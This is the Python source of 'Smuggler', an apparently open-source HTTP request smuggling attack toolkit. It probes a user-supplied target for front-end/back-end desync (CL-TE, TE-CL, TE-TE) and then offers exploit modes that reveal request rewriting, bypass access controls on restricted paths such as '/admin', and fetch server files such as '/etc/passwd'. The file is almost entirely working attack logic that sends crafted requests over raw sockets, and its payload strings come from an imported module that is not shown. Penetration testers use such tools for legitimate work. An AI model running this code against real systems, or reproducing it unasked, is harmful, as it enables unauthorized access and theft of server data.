#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
Smuggler (HTTP -Smuggling- Attack Toolkit) - 2020 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with PandeMaths; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, socket, ssl

VERSION = "v:0.3beta"
RELEASE = "28042020"
SOURCE1 = "https://code.03c8.net/epsylon/smuggler"
SOURCE2 = "https://github.com/epsylon/smuggler"
CONTACT = "epsylon@riseup.net - (https://03c8.net)"

try:
    import payloads.payloads # import payloads
except:
    print ("\n[Info] Try to run the tool with Python3.x.y... (ex: python3 smuggler.py) -> [EXITING!]\n")
    sys.exit()

VULNERABLE_LIST = []

def set_target():
    target = input("\n  + Enter TARGET (ex: 'http(s)://www.evilcorp.com'): ").lower()
    if target.startswith("http://"):
        target = target.replace("http://","")
        port = 80
        SSL = False
    elif target.startswith("https://"):
        target = target.replace("https://","")
        port = 443
        SSL = True
    else:
        print("\n"+"-"*45)
        print("\n[Error] Target is invalid: '"+str(target)+"'\n")
        print("-"*45)
        sys.exit()
    method = input("\n  + Enter HTTP METHOD (default: 'POST'): ").upper()
    if method == "GET" or method == "POST":
        pass
    else:
        if method == "":
            method = "POST"
        else:
            print("\n"+"-"*45)
            print("\n[Error] Method is invalid: '"+str(method)+"'\n")
            print("-"*45)
            sys.exit()
    path = input("\n  + Enter PATH (default: '/'): ")
    if path == "":
        path = "/"
    return target, port, SSL, method, path

def detect(final): # detect menu
    target, port, SSL, method, path = set_target() # set target
    print("\n"+"="*50 + "\n")
    print("[Info] Starting -HTTP Smuggling- Timing detection ...")
    payloads_dsync = payloads.payloads.payloads # load payloads
    addr = (target, port)
    print("")
    for payload in payloads_dsync:
        attack_type = payload.split("#")[0]
        payload_type = payload.split("#")[1]
        print("="*50)
        print("Trying payload: ["+str(attack_type)+"]")
        print("="*50+"\n")
        payload = method+" "+path+" HTTP/1.1\r\nHost: "+target+"\r\n"+payload_type # main smuggling payload
        print("+ PAYLOAD:\n")
        print(payload)
        send_payload(attack_type, payload, addr, SSL) # send each payload
    if final == True:
        show_final_results(target, port, method, path, final)
    else:
        t, p, m, pt = show_final_results(target, port, method, path, final)
        return t, p, m, pt, SSL

def send_payload(attack_type, payload, addr, SSL):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if SSL == True: # ssl
        ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
    try:
        if SSL == True: # ssl
            ss.connect(addr)
        else:
            s.connect(addr)
    except:
        print("-"*45)
        print("[Error] Generating socket... -> [PASSING!]")
        print("-"*45+"\n")
        s.close()
        if SSL == True: # ssl
            ss.close()
        return
    for i in range(0,10): # x10 tests
        if SSL == True: # ssl
            ss.send(payload.encode('utf-8'))
        else:
            s.send(payload.encode('utf-8'))
    datas=""
    while 1:
        if SSL == True: # ssl
            data = ss.recv(1024)
        else:
            data = s.recv(1024)
        if not data:        
            break
        try:
            datas += str(data.decode('utf-8'))
        except:
            pass
    print("\n+ REPLY:\n")
    print(str(datas))
    resp_c=0
    resp=""
    wait=False
    for line in datas.split('\n'):
        if "502" in line or "501" in line or "404" in line or "405" in line:
            wait=False
            resp_c+=1
        else:
            wait=True
        if not wait:
            resp += line+'\n'
    print("-"*45)
    if resp_c > 0 and "not supported for current URL" in str(datas):
        print ("PAYLOAD: ["+str(attack_type)+"] is WORKING! ;-)")
        VULNERABLE_LIST.append(attack_type) # add attack type for results
    else:
        print ("PAYLOAD: ["+str(attack_type)+"] is NOT working...")
    print("-"*45+"\n")
    s.close()
    if SSL == True: # ssl
        ss.close()

def show_final_results(target, port, method, path, final):
    print("="*50)
    print("\n+ Detection RESULT: -HTTP Smuggling- Timing Attack\n")
    print("-"*45+"\n")
    print("  - TARGET: "+str(target)+":"+str(port))
    print("  - Method: "+str(method))
    print("  - Path  : "+str(path))
    TETE = False
    TECL = False
    CLTE = False
    CLCL = False
    if VULNERABLE_LIST: 
        print("\n  - STATUS: [ VULNERABLE !!! ]\n")
        for v in VULNERABLE_LIST: # resume vulnerable payloads found
            if v.startswith("TE-TE") and TETE == False: # TE-TE
                print("    * [TE-TE]: [Front-end: Transfer-Encoding] <-> [Back-end: Transfer-Encoding]")
                TETE = True
            elif v.startswith("TE-CL") and TECL == False: # TE-CL
                print("    * [TE-CL]: [Front-end: Transfer-Encoding] <-> [Back-end: Content-Length]")
                TECL = True
            elif v.startswith("CL-TE") and CLTE == False: # CL-TE
                print("    * [CL-TE]: [Front-end: Content-Length] <-> [Back-end: Transfer-Encoding]")
                CLTE = True
            else:
                print("    * [CL-CL]: [Front-end: Content-Length] <-> [Back-end: Content-Length]")
                CLCL = True
    else:
        print("\n  - STATUS: [ NOT VULNERABLE ]")
        print("\n"+"="*50+"\n")
        sys.exit() # exit when not vulnerable!
    if final == False: # keep exploiting
        return target, port, method, path
    print("\n"+"="*50+"\n")

def exploit(): # exploit menu
    exploit = input("\n+ SELECT EXPLOIT:\n\n  (0) Verify Injection (Back-End)\n  (1) Reveal Rewriting (Front-End)\n  (2) Bypass ACLs (Front-End)\n  (3) Fetch Files (Back-End)\n\n")
    if exploit == "0": # verify acccess (back-end)
        exploit_verify()
    elif exploit == "1": # reveal (front-end)
        exploit_reveal()
    elif exploit == "2": # bypass (front-end)
        exploit_bypass()
    elif exploit == "3": # fetch files (back-end)
        exploit_steal()
    else: # exit
        print ("[Info] Not any valid exploit selected... -> [EXITING!]\n")
        sys.exit()

def send_exploit(addr, SSL, exploit, exploit_type):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if SSL == True: # ssl
        ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
    try:
        if SSL == True: # ssl
            ss.connect(addr)
        else:
            s.connect(addr)
    except:
        print("\n"+"-"*45)
        print("[Error] Generating socket... -> [PASSING!]")
        print("-"*45+"\n")
        s.close()
        if SSL == True: # ssl
            ss.close()
        return
    for i in range(0,2): # send exploit twice
        if SSL == True: # ssl
            ss.send(exploit.encode('utf-8'))
        else:
            s.send(exploit.encode('utf-8'))
    datas=""
    while 1:
        if SSL == True: # ssl
            data = ss.recv(1024)
        else:
            data = s.recv(1024)
        if not data:
            break
        try:
            datas += str(data.decode('utf-8'))
        except:
            pass
    print("\n+ REPLY:\n")
    print(str(datas))
    if exploit_type == "VERIFY":
        print("\n"+"-"*45)
        print("\n[Info] Congratulations!!! ;-)\n\n Your 'chunked' requests have arrived correctly: \n")
        if "YPOST  not supported for current URL" in str(datas):
            print("  -> Invalid HTTP method: 'YPOST' (not supported)\n")
        elif "YGET  not supported for current URL" in str(datas):
            print("  -> Invalid HTTP method: 'YGET' (not supported)\n")

def exploit_verify():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to verify injections (generating Back-End errors)...")
    target, port, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "0": # verify reading
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$target", target)
                        smuggled = s.split("#")[1].replace("\n","")
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                content_length = len(smuggled)-1
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, "VERIFY") # send expoit

def exploit_reveal():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to reveal Front-End rewriting...")
    target, port, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    parameter = input("\n  + Enter PARAMETER reflected (ex: 'q', '_username', ...): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "1": # reveal rewriting
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$target", target)
                        s = s.replace("$parameter", parameter)
                        content_length = len(parameter)+2+50
                        s = s.replace("$CL", str(content_length))
                        smuggled = s.split("#")[1]
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$parameter", parameter)
                content_length = len(smuggled)
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, "REVEAL") # send expoit

def exploit_bypass():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to bypass Front-End ACLs...")
    target, port, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    restricted = input("\n  + Enter RESTRICTED ZONE (ex: '/admin', /wp-admin/, ...): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "2": # bypass ACLs
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$target", target)
                        s = s.replace("$restricted", restricted)
                        content_length = 10 # $CL method
                        s = s.replace("$CL", str(content_length))
                        smuggled = s.split("#")[1]
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$restricted", restricted)
                content_length = len(smuggled)
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, "BYPASS") # send expoit

def exploit_steal():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to fetch files (via Back-End) from server...")
    target, port, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    files = input("\n  + Enter FILE (ex: '/etc/passwd', '/server/config_db.php', ...): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "3": # fetch files
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$target", target)
                        s = s.replace("$files", files)
                        content_length = len(files)+2 # p=len(files)
                        s = s.replace("$CL", str(content_length))
                        smuggled = s.split("#")[1]
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$files", files)
                content_length = len(smuggled)
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD MODE: ["+str(exp.split("#")[0])+"] \n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, "STEAL") # send expoit

def print_banner():
    print("\n"+"="*50)
    print(" ____  __  __ _   _  ____  ____ _     _____ ____  ")
    print("/ ___||  \/  | | | |/ ___|/ ___| |   | ____|  _ \ ")
    print("\___ \| |\/| | | | | |  _| |  _| |   |  _| | |_) |")
    print(" ___) | |  | | |_| | |_| | |_| | |___| |___|  _ < ")
    print("|____/|_|  |_|\___/ \____|\____|_____|_____|_| \_\ by psy")
    print('\n"HTTP -Smuggling- (DSYNC) Attacking Toolkit"')
    print("\n"+"-"*15+"\n")
    print(" * VERSION: ")
    print("   + "+VERSION+" - (rev:"+RELEASE+")")
    print("\n * SOURCES:")
    print("   + "+SOURCE1)
    print("   + "+SOURCE2)
    print("\n * CONTACT: ")
    print("   + "+CONTACT+"\n")
    print("-"*15+"\n")
    print("="*50)

# sub_init #
print_banner() # show banner
option = input("\n+ CHOOSE: (D)etect or (E)ploit: ").upper()
print("\n"+"="*50)
if option == "D": # detecting phase
    detect(True) # only detect
elif option == "E": # trying to exploit
    exploit()
else:
    print("\n"+"-"*45+"\n")
    print("[Smuggler by psy (https://03c8.net)]\n\n  Bye! ;-)\n")
    sys.exit()
